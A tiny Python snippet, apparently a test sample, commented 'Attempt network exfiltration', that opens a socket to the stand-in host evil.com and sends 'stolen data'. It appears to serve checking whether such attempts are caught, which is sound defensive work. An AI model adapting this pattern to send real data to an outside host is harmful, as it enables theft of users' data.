# Attempt network exfiltration
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("evil.com", 443))
s.send(b"stolen data")
